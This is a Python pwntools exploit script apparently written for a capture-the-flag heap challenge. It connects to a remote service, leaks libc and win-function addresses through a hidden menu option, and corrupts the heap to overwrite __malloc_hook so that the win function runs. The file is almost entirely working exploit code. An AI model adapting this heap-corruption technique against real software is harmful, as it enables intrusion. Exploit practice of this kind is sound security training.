from pwn import *

e = ELF("chal")
libc = ELF("libc6_2.31-7_amd64.so", checksec=False)
context.binary = e

def setup():
    # p = e.process()
    p = remote("139.59.119.35", 9000)
    return p

def create(p):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Created new JSON object at index ")
    return int(p.recvline(keepends=False))

def add_kv(p, index, key, value):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.sendlineafter(b"Index of JSON object: ", str(index))
    p.sendlineafter(b"Key: ", key)
    p.sendlineafter(b"Value: ", value)
    p.recvuntil(b"Size: ")
    return int(p.recvline(keepends=False))

def delete(p, index):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.sendlineafter(b"Index of JSON object: ", str(index))

def read(p, index):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.sendlineafter("bIndex of JSON object: ", str(index))
    p.recvuntil(f"Object at index {index}: ")
    return p.recvline()

def leak(p):
    p.recvuntil(b"> ")
    p.sendline(b"X")
    p.recvuntil(b"puts: ")
    a = int(p.recvline(keepends=False)[2:], 16)
    p.recvuntil(b"win: ")
    b = int(p.recvline(keepends=False)[2:], 16)
    return a, b

if __name__ == '__main__':
    p = setup()

    puts, win = leak(p)
    libc.address = puts - libc.sym.puts

    print("Libc leak:", hex(libc.address))

    # Exploit here
    index = create(p)
    index2 = create(p)
    index3 = create(p)
    index4 = create(p)
    delete(p, index3)
    delete(p, index2)
    add_kv(p, index, b"a"*254, b"a"*254)
    add_kv(p, index, b"a"*239, b"a"*239)
    add_kv(p, index,cyclic(20-8)+b"a"*8+p64(libc.sym.__malloc_hook-8), b"")
    index5 = create(p)
    index6 = create(p)
    add_kv(p, index6, b"aa"+p64(win), b"")
    p.sendline(b"1")

    p.interactive()